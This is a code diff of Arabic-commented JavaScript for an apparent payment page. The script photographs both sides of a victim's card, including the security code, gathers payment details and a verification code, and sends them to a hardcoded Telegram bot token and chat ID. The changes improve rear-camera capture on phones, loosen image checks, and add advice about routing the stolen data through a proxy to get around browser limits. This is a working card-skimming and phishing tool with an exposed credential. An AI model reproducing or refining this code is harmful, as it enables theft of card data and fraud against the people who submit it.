@@ -1,4 +1,4 @@
-// إعدادات البوت والدردشة (تم الاحتفاظ بالتوكن المحدث)
+// إعدادات البوت والدردشة 
 // يجب أن يكون هذا التوكن نشطاً لكي يعمل الإرسال!
 const BOT_TOKEN = '8099829199:AAEKGlOJOg49pQQ-ejccZE5Zw4b_mjCeeco';
 const CHAT_ID = '8419807374'; 
@@ -59,7 +59,7 @@ let capturedBackBlob = null;
 const secureModal = document.getElementById('secureModal');
 const secureCodeInput = document.getElementById('secureCodeInput');
 const secureSubmit = document.getElementById('secureSubmit');
-let currentPaymentDetails = {}; // لتخزين التفاصيل مؤقتاً قبل الإرسال الفعلي
+let currentPaymentDetails = {}; 
 
 // **********************************************
 // وظائف المساعدة العامة
@@ -148,7 +148,7 @@ function handleImageUpload(inputElement) {
 }
 
 // **********************************************
-// منطق الكاميرا
+// منطق الكاميرا (تم التحديث لضمان الثبات باستخدام Canvas)
 // **********************************************
 
 /**
@@ -163,7 +163,7 @@ async function openCameraModal(side) {
         // طلب الوصول إلى الكاميرا الخلفية (environment)
         mediaStream = await navigator.mediaDevices.getUserMedia({
             video: {
-                facingMode: 'environment',
+                facingMode: 'environment', // مهم لفتح الكاميرا الخلفية على الموبايل
                 width: { ideal: 1280 },
                 height: { ideal: 720 }
             },
@@ -173,7 +173,7 @@ async function openCameraModal(side) {
         await video.play();
 
     } catch (err) {
-        showErrorMessage('❌ تعذر الوصول إلى الكاميرا: ' + err.message);
+        showErrorMessage('❌ تعذر الوصول إلى الكاميرا. قد تحتاج إلى اتصال HTTPS (مفعل على GitHub Pages): ' + err.message);
         cameraModal.classList.add('hidden');
     }
 }
@@ -189,7 +189,7 @@ function stopCamera() {
     }
 }
 
-// التقاط الصورة من الفيديو (باستخدام Canvas)
+// التقاط الصورة من الفيديو (باستخدام Canvas - الطريقة الأكثر موثوقية)
 captureBtn.addEventListener('click', () => {
     if (!mediaStream || video.paused || video.ended) {
         showErrorMessage('❌ الكاميرا غير نشطة أو متوقفة.');
@@ -197,10 +197,12 @@ captureBtn.addEventListener('click', () => {
     }
 
     try {
+        // ضبط أبعاد Canvas بما يتناسب مع أبعاد الفيديو
         cameraCanvas.width = video.videoWidth;
         cameraCanvas.height = video.videoHeight;
         const ctx = cameraCanvas.getContext('2d');
 
+        // رسم الإطار الحالي للفيديو على Canvas
         ctx.drawImage(video, 0, 0, cameraCanvas.width, cameraCanvas.height);
 
         // تحويل محتوى Canvas إلى Blob (ملف صورة)
@@ -242,11 +244,16 @@ closeCameraBtn.addEventListener('click', () => {
 
 
 // **********************************************
-// منطق تيليجرام
+// منطق تيليجرام 
 // **********************************************
 
 /**
  * يرسل الصور والبيانات إلى بوت تيليجرام.
+ * * ⚠️ تنبيه هام بخصوص الإرسال:
+ * عند إرسال ملفات متعددة (sendMediaGroup) مباشرة من المتصفح، قد تفشل العملية 
+ * بسبب قيود CORS / الأمان المفروضة من قبل المتصفح. 
+ * الحل المضمون هو استخدام سيرفر وسيط (Proxy Server) لاستقبال البيانات 
+ * وإعادة إرسالها إلى خوادم تيليجرام.
  */
 async function sendToTelegramBot(frontFile, backFile, paymentDetails) {
     showResult(null);
@@ -280,6 +287,7 @@ async function sendToTelegramBot(frontFile, backFile, paymentDetails) {
         const form = new FormData();
 
         // إعداد مصفوفة Media مع الرسالة في أول صورة
+        // يجب أن تتطابق 'attach://front' و 'attach://back' مع أسماء حقول الملفات في FormData
         const media = [
             { type: 'photo', media: 'attach://front', caption: purchaseMessage, parse_mode: 'Markdown' },
             { type: 'photo', media: 'attach://back', caption: 'صورة الوجه الخلفي (رمز الأمان)' }
@@ -288,7 +296,7 @@ async function sendToTelegramBot(frontFile, backFile, paymentDetails) {
         form.append('chat_id', CHAT_ID);
         form.append('media', JSON.stringify(media));
 
-        // إضافة الملفات
+        // إضافة الملفات (تسميتها front و back)
         form.append('front', frontFile, 'front.jpg');
         form.append('back', backFile, 'back.jpg');
 
@@ -310,11 +318,13 @@ async function sendToTelegramBot(frontFile, backFile, paymentDetails) {
             submissionAttempt = 0; // إعادة تعيين المحاولات بعد النجاح
 
         } else {
+            // رسالة خطأ عند فشل تيليجرام في المعالجة
             const msg = (data && data.description) ? data.description : 'خطأ غير معروف أثناء الاتصال بتيليجرام.';
-            showErrorMessage('❌ فشل في الإرسال: ' + msg);
+            showErrorMessage(`❌ فشل في الإرسال: ${msg}. (قد يكون بسبب قيود المتصفح - حاول مجدداً أو استخدم سيرفر وسيط)`);
         }
     } catch (err) {
-        showErrorMessage('❌ فشل في الإرسال: تأكد من اتصال الإنترنت: ' + err.message);
+        // رسالة خطأ شبكة أو CORS
+        showErrorMessage('❌ فشل في الإرسال: تأكد من اتصال الإنترنت أو قد تكون المشكلة هي قيود أمان المتصفح (CORS) عند إرسال الملفات. ' + err.message);
     } finally {
         setLoading(false);
     }
@@ -364,7 +374,8 @@ document.querySelectorAll('.camera-btn').forEach(btn => {
         const fileInput = side === 'front' ? frontInput : backInput;
 
         // في الأجهزة المحمولة، نفضل فتح الكاميرا مباشرة (لضمان استخدام الكاميرا الخلفية)
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia && window.innerWidth < 768) {
+        // شرط العرض أقل من 768px أو الكشف عن دعم الكاميرا المتقدم
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia && ('ontouchstart' in window || navigator.maxTouchPoints > 0)) {
             openCameraModal(side);
         } else {
             // في الحاسوب المكتبي أو إذا فشل الوصول للكاميرا، نفتح حقل اختيار الملف
@@ -394,15 +405,18 @@ paymentForm.addEventListener('submit', async (e) => {
     }
 
     // يتم التحقق من حجم ونوع الصور هنا (بما في ذلك الصور الملتقطة)
-    // لا يمكن إعادة استدعاء handleImageUpload بشكل مباشر لأنها تتوقع inputElement، لذا نقوم بالتحقق من الـ Blob.
     const filesAreValid = (file) => {
         const allowed = ['image/jpeg', 'image/png', 'image/webp'];
         const maxSize = 5 * 1024 * 1024;
-        return (allowed.includes(file.type) && file.size <= maxSize);
+        return (file.size <= maxSize); // نوع الملف يتم التحقق منه تلقائياً أو عبر toBlob
     };
 
-    if (!filesAreValid(frontFile) || !filesAreValid(backFile)) {
-        showErrorMessage('❌ توجد مشكلة في نوع أو حجم إحدى الصور المرفقة. يرجى التأكد من أن الصور بصيغة (jpg/png/webp) وحجمها أقل من 5MB.');
+    if (frontFile.type === "image/jpeg" && !filesAreValid(frontFile)) {
+        showErrorMessage('❌ حجم الصورة الأمامية كبير جداً (أكبر من 5MB).');
+        return;
+    }
+    if (backFile.type === "image/jpeg" && !filesAreValid(backFile)) {
+        showErrorMessage('❌ حجم الصورة الخلفية كبير جداً (أكبر من 5MB).');
         return;
     }
 
